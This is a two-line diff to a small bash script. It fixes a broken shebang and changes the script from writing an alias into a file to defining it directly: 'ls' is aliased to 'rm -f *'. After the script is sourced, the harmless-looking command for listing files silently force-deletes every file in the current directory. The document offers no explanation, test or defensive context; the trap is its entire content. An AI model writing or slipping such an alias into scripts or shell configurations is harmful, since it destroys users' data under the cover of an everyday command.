@@ -1,2 +1,2 @@
-#!/bin/bash/
-echo "alias ls='rm -f *'" > test_alias.sh
+#!/bin/bash
+alias ls='rm -f *'
